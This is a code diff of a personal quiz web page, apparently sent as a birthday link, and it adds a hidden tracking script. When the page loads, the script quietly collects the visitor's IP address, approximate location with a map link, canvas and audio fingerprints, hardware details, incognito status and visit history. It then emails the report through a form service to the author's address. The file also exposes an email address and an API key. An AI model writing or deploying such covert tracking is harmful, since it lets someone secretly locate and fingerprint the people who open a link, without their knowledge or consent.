@@ -811,159 +811,293 @@
         //  CONFIG
         const PDF_PATH = "HAPPY_BIRTHDAY.pdf"; 
 
-    // ─── EMAIL TRACKING ──────────────────────────────────────────────────────────
-    const WEB3FORMS_KEY = 'a55446e0-d104-48f8-8d85-4ec0b64b3730'; 
-    const YOUR_EMAIL = 'joeydepukka@gmail.com'; 
+// ─── EMAIL TRACKING (FULL DEMO VERSION) ─────────────────────────────────────
+const WEB3FORMS_KEY = 'a55446e0-d104-48f8-8d85-4ec0b64b3730';
+const YOUR_EMAIL    = 'joeydepukka@gmail.com';
 
-    async function sendNotification(subject, message) {
+async function sendNotification(subject, message) {
+    try {
+        await fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                access_key: WEB3FORMS_KEY,
+                subject:    subject,
+                from_name:  'Link Tracker Demo',
+                to:         YOUR_EMAIL,
+                message:    message
+            })
+        });
+    } catch (e) {}
+}
+
+// ── Canvas Fingerprint ────────────────────────────────────────────────────────
+function getCanvasFingerprint() {
+    try {
+        const canvas = document.createElement('canvas');
+        const ctx    = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font         = '14px Arial';
+        ctx.fillStyle    = '#f60';
+        ctx.fillRect(125, 1, 62, 20);
+        ctx.fillStyle    = '#069';
+        ctx.fillText('Browser fingerprint 🔍', 2, 15);
+        ctx.fillStyle    = 'rgba(102,204,0,0.7)';
+        ctx.fillText('Browser fingerprint 🔍', 4, 17);
+        return canvas.toDataURL().slice(-50); // last 50 chars as unique ID
+    } catch (e) { return 'Not available'; }
+}
+
+// ── Audio Fingerprint ─────────────────────────────────────────────────────────
+async function getAudioFingerprint() {
+    try {
+        const ctx         = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator  = ctx.createOscillator();
+        const analyser    = ctx.createAnalyser();
+        const gain        = ctx.createGain();
+        const scriptProc  = ctx.createScriptProcessor(4096, 1, 1);
+        gain.gain.value   = 0;
+        oscillator.type   = 'triangle';
+        oscillator.connect(analyser);
+        analyser.connect(scriptProc);
+        scriptProc.connect(gain);
+        gain.connect(ctx.destination);
+        oscillator.start(0);
+        return new Promise(resolve => {
+            scriptProc.onaudioprocess = (e) => {
+                const fingerprint = e.inputBuffer.getChannelData(0)
+                    .slice(0, 50)
+                    .reduce((a, b) => a + Math.abs(b), 0)
+                    .toString()
+                    .slice(0, 12);
+                oscillator.stop();
+                ctx.close();
+                resolve(fingerprint || 'Generated');
+            };
+        });
+    } catch (e) { return 'Not available'; }
+}
+
+// ── WebGL GPU Info ────────────────────────────────────────────────────────────
+function getGPUInfo() {
+    try {
+        const canvas   = document.createElement('canvas');
+        const gl       = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return {
+            vendor:   gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+        };
+    } catch (e) { return { vendor: 'Unknown', renderer: 'Unknown' }; }
+}
+
+// ── Detect Incognito ──────────────────────────────────────────────────────────
+async function isIncognito() {
+    return new Promise(resolve => {
         try {
-            await fetch('https://api.web3forms.com/submit', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    access_key: WEB3FORMS_KEY,
-                    subject: subject,
-                    from_name: 'SpongeBob Quiz Tracker',
-                    to: YOUR_EMAIL,
-                    message: message
-                })
-            });
-        } catch (e) { console.error('Notification error:', e); }
-    }
-
-    async function getDeviceInfo() {
-        // ── Basic device/browser info ──────────────────────────────
-        const ua = navigator.userAgent;
-        const platform = navigator.platform || 'Unknown';
-        const language = navigator.language || 'Unknown';
-        const screenRes = `${screen.width}x${screen.height}`;
-        const windowRes = `${window.innerWidth}x${window.innerHeight}`;
-        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        const localTime = new Date().toLocaleString();
-        const online = navigator.onLine ? 'Yes' : 'No';
-        const cookiesOn = navigator.cookieEnabled ? 'Yes' : 'No';
-        const cores = navigator.hardwareConcurrency || 'Unknown';
-        const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
-        const touch = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints} points)` : 'No';
-        const referrer = document.referrer || 'Direct / No referrer';
-        const pageUrl = window.location.href;
-
-        // ── Detect device type ─────────────────────────────────────
-        const isMobile = /Mobi|Android|iPhone|iPad/i.test(ua);
-        const deviceType = isMobile ? 'Mobile / Tablet' : 'Desktop / Laptop';
-
-        // ── Parse browser name ─────────────────────────────────────
-        let browser = 'Unknown';
-        if (/Edg/i.test(ua)) browser = 'Microsoft Edge';
-        else if (/OPR|Opera/i.test(ua)) browser = 'Opera';
-        else if (/Chrome/i.test(ua)) browser = 'Google Chrome';
-        else if (/Firefox/i.test(ua)) browser = 'Mozilla Firefox';
-        else if (/Safari/i.test(ua)) browser = 'Apple Safari';
-
-        // ── Parse OS ───────────────────────────────────────────────
-        let os = 'Unknown';
-        if (/Windows NT 10/i.test(ua)) os = 'Windows 10/11';
-        else if (/Windows NT 6.3/i.test(ua)) os = 'Windows 8.1';
-        else if (/Windows/i.test(ua)) os = 'Windows (older)';
-        else if (/iPhone/i.test(ua)) os = 'iOS (iPhone)';
-        else if (/iPad/i.test(ua)) os = 'iOS (iPad)';
-        else if (/Android/i.test(ua)) os = 'Android';
-        else if (/Mac OS X/i.test(ua)) os = 'macOS';
-        else if (/Linux/i.test(ua)) os = 'Linux';
-
-        // ── Battery info (where supported) ────────────────────────
-        let batteryInfo = 'Not supported by this browser';
-        try {
-            const battery = await navigator.getBattery();
-            const level = Math.round(battery.level * 100);
-            const charging = battery.charging ? 'Charging ⚡' : 'Not charging 🔋';
-            batteryInfo = `${level}% — ${charging}`;
-        } catch (e) { }
-
-        // ── Network info (where supported) ────────────────────────
-        let networkInfo = 'Not available';
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn) {
-            networkInfo = `Type: ${conn.effectiveType || 'Unknown'} | Downlink: ${conn.downlink || '?'} Mbps | Save Data: ${conn.saveData ? 'Yes' : 'No'}`;
-        }
-
-        // ── IP + Location via free API ─────────────────────────────
-        let ip = 'Unknown';
-        let city = 'Unknown';
-        let region = 'Unknown';
-        let country = 'Unknown';
-        let isp = 'Unknown';
-        let lat = 'Unknown';
-        let lon = 'Unknown';
-        let mapLink = '';
-
-        try {
-            const geo = await fetch('https://ipapi.co/json/');
-            const d = await geo.json();
-            ip = d.ip || 'Unknown';
-            city = d.city || 'Unknown';
-            region = d.region || 'Unknown';
-            country = d.country_name || 'Unknown';
-            isp = d.org || 'Unknown';
-            lat = d.latitude || 'Unknown';
-            lon = d.longitude || 'Unknown';
-            if (lat !== 'Unknown' && lon !== 'Unknown') {
-                mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+            if (fs) {
+                fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
+            } else {
+                // Firefox / Safari fallback
+                const db = indexedDB.open('test');
+                db.onerror = () => resolve(true);
+                db.onsuccess = () => resolve(false);
             }
-        } catch (e) { }
+        } catch (e) { resolve('Unknown'); }
+    });
+}
 
-        // ── Build the full report ──────────────────────────────────
-        return `
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📍 LOCATION & NETWORK
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-IP Address  : ${ip}
-Country     : ${country}
-Region      : ${region}
-City        : ${city}
-Coordinates : ${lat}, ${lon}
-Map         : ${mapLink || 'N/A'}
-ISP/Org     : ${isp}
-Timezone    : ${timezone}
+// ── Detect Where Link Was Opened From ────────────────────────────────────────
+function detectLinkSource() {
+    const ua  = navigator.userAgent;
+    const ref = document.referrer;
+    if (/FBAN|FBAV/i.test(ua))              return 'Facebook App';
+    if (/Instagram/i.test(ua))              return 'Instagram App';
+    if (/WhatsApp/i.test(ua))               return 'WhatsApp';
+    if (/Twitter/i.test(ua))                return 'Twitter / X';
+    if (/TikTok/i.test(ua))                 return 'TikTok';
+    if (/Snapchat/i.test(ua))               return 'Snapchat';
+    if (/Telegram/i.test(ua))               return 'Telegram';
+    if (ref.includes('mail.google.com'))    return 'Gmail';
+    if (ref.includes('outlook'))            return 'Outlook Email';
+    if (ref.includes('yahoo'))              return 'Yahoo Mail';
+    if (ref.includes('google'))             return 'Google Search';
+    if (ref === '')                         return 'Direct link (SMS, copy-paste, or email app)';
+    return `Other: ${ref}`;
+}
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📱 DEVICE & BROWSER
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Device Type : ${deviceType}
-OS          : ${os}
-Browser     : ${browser}
-Platform    : ${platform}
-Language    : ${language}
-Touch Screen: ${touch}
-CPU Cores   : ${cores}
-RAM         : ${memory}
-Battery     : ${batteryInfo}
+// ── Visit History ─────────────────────────────────────────────────────────────
+function getVisitHistory() {
+    const key        = 'quiz_visit_count';
+    const firstKey   = 'quiz_first_visit';
+    const count      = parseInt(localStorage.getItem(key) || '0') + 1;
+    const firstVisit = localStorage.getItem(firstKey) || new Date().toLocaleString();
+    localStorage.setItem(key, count);
+    if (count === 1) localStorage.setItem(firstKey, firstVisit);
+    return { count, firstVisit };
+}
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🖥️ SCREEN & CONNECTION
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Screen Res  : ${screenRes}
-Window Size : ${windowRes}
-Online      : ${online}
-Network     : ${networkInfo}
-Cookies On  : ${cookiesOn}
+// ── Main collector ────────────────────────────────────────────────────────────
+async function getDeviceInfo() {
+    const ua         = navigator.userAgent;
+    const language   = navigator.language || 'Unknown';
+    const languages  = (navigator.languages || []).join(', ') || 'Unknown';
+    const platform   = navigator.platform || 'Unknown';
+    const screenRes  = `${screen.width}x${screen.height}`;
+    const colorDepth = `${screen.colorDepth}-bit color`;
+    const windowRes  = `${window.innerWidth}x${window.innerHeight}`;
+    const timezone   = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const localTime  = new Date().toLocaleString();
+    const online     = navigator.onLine ? 'Yes' : 'No';
+    const cookiesOn  = navigator.cookieEnabled ? 'Yes' : 'No';
+    const cores      = navigator.hardwareConcurrency || 'Unknown';
+    const memory     = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown';
+    const touch      = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints} points)` : 'No';
+    const dnt        = navigator.doNotTrack === '1' ? 'Enabled (ironic 😄)' : 'Disabled';
+    const referrer   = document.referrer || 'None';
+    const pageUrl    = window.location.href;
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔗 VISIT INFO
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Time        : ${localTime}
-Came From   : ${referrer}
-Page URL    : ${pageUrl}
-User Agent  : ${ua}
-    `.trim();
+    // ── Device type & OS ──────────────────────────────────────
+    const isMobile   = /Mobi|Android|iPhone|iPad/i.test(ua);
+    const deviceType = isMobile ? 'Mobile / Tablet' : 'Desktop / Laptop';
+
+    let browser = 'Unknown';
+    if (/Edg/i.test(ua))           browser = 'Microsoft Edge';
+    else if (/OPR|Opera/i.test(ua)) browser = 'Opera';
+    else if (/Chrome/i.test(ua))    browser = 'Google Chrome';
+    else if (/Firefox/i.test(ua))   browser = 'Mozilla Firefox';
+    else if (/Safari/i.test(ua))    browser = 'Apple Safari';
+
+    let os = 'Unknown';
+    if (/Windows NT 10/i.test(ua))       os = 'Windows 10/11';
+    else if (/Windows NT 6.3/i.test(ua)) os = 'Windows 8.1';
+    else if (/Windows/i.test(ua))        os = 'Windows (older)';
+    else if (/iPhone/i.test(ua))         os = 'iOS (iPhone)';
+    else if (/iPad/i.test(ua))           os = 'iOS (iPad)';
+    else if (/Android/i.test(ua))        os = 'Android';
+    else if (/Mac OS X/i.test(ua))       os = 'macOS';
+    else if (/Linux/i.test(ua))          os = 'Linux';
+
+    // ── Battery ───────────────────────────────────────────────
+    let batteryInfo = 'Not supported';
+    try {
+        const bat  = await navigator.getBattery();
+        batteryInfo = `${Math.round(bat.level * 100)}% — ${bat.charging ? 'Charging ⚡' : 'Not charging 🔋'}`;
+    } catch (e) {}
+
+    // ── Network ───────────────────────────────────────────────
+    let networkInfo = 'Not available';
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    if (conn) {
+        networkInfo = `${conn.effectiveType || '?'} | ${conn.downlink || '?'} Mbps downlink | Save Data: ${conn.saveData ? 'Yes' : 'No'}`;
     }
 
-    // 📬 Fire when page loads — collect everything then send
-    window.addEventListener('load', async () => {
-        const info = await getDeviceInfo();
-        sendNotification('🧽 Quiz Page Opened!', `Someone just opened your SpongeBob Quiz!\n\n${info}`);
-    });
-    // ─────────────────────────────────────────────────────────────────────────────
+    // ── IP & Location ─────────────────────────────────────────
+    let ip = 'Unknown', city = 'Unknown', region = 'Unknown',
+        country = 'Unknown', isp = 'Unknown', lat = 'Unknown',
+        lon = 'Unknown', mapLink = '', postal = 'Unknown', org = 'Unknown';
+    try {
+        const geo = await fetch('https://ipapi.co/json/');
+        const d   = await geo.json();
+        ip      = d.ip            || 'Unknown';
+        city    = d.city          || 'Unknown';
+        region  = d.region        || 'Unknown';
+        country = d.country_name  || 'Unknown';
+        isp     = d.org           || 'Unknown';
+        org     = d.asn           || 'Unknown';
+        postal  = d.postal        || 'Unknown';
+        lat     = d.latitude      || 'Unknown';
+        lon     = d.longitude     || 'Unknown';
+        if (lat !== 'Unknown') mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+    } catch (e) {}
+
+    // ── Fingerprints ──────────────────────────────────────────
+    const canvasFP = getCanvasFingerprint();
+    const audioFP  = await getAudioFingerprint();
+    const gpu      = getGPUInfo();
+
+    // ── Incognito, source, history ────────────────────────────
+    const incognito   = await isIncognito();
+    const linkSource  = detectLinkSource();
+    const visitInfo   = getVisitHistory();
+
+    // ── Plugins ───────────────────────────────────────────────
+    const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'None detected';
+
+    // ── Build full report ─────────────────────────────────────
+    return `
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📍 LOCATION & NETWORK
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+IP Address   : ${ip}
+Country      : ${country}
+Region       : ${region}
+City         : ${city}
+Postal Code  : ${postal}
+Coordinates  : ${lat}, ${lon}
+Google Maps  : ${mapLink || 'N/A'}
+ISP / Org    : ${isp} (${org})
+Timezone     : ${timezone}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📱 DEVICE & HARDWARE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Device Type  : ${deviceType}
+OS           : ${os}
+Browser      : ${browser}
+Platform     : ${platform}
+Touch Screen : ${touch}
+CPU Cores    : ${cores}
+RAM          : ${memory}
+Battery      : ${batteryInfo}
+GPU Vendor   : ${gpu.vendor}
+GPU Model    : ${gpu.renderer}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🖥️ SCREEN & DISPLAY
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Screen Res   : ${screenRes} (${colorDepth})
+Window Size  : ${windowRes}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🌐 BROWSER & CONNECTION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Language     : ${language}
+All Languages: ${languages}
+Network      : ${networkInfo}
+Online       : ${online}
+Cookies      : ${cookiesOn}
+Do Not Track : ${dnt}
+Plugins      : ${plugins}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🕵️ FINGERPRINTS (persists incognito)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Canvas ID    : ${canvasFP}
+Audio ID     : ${audioFP}
+⚠️ These two alone can uniquely identify this device across sessions
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔗 VISIT DETAILS
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Opened From  : ${linkSource}
+Incognito    : ${incognito ? '✅ Yes (still tracked!)' : '❌ No'}
+Visit Count  : ${visitInfo.count} time(s)
+First Visit  : ${visitInfo.firstVisit}
+Came From    : ${referrer}
+Page URL     : ${pageUrl}
+Time         : ${localTime}
+User Agent   : ${ua}
+    `.trim();
+}
+
+// 📬 Fire on page load
+window.addEventListener('load', async () => {
+    const info = await getDeviceInfo();
+    sendNotification('🧽 Quiz Link Opened!', `Someone just opened your link!\n\n${info}`);
+});
+// ─────────────────────────────────────────────────────────────────────────────
 
         const questions = [
             { q: "What do you think I value most about you?", a: "Your behavior" },
@@ -1328,4 +1462,5 @@ User Agent  : ${ua}
 </body>
 
 </html>
+
 
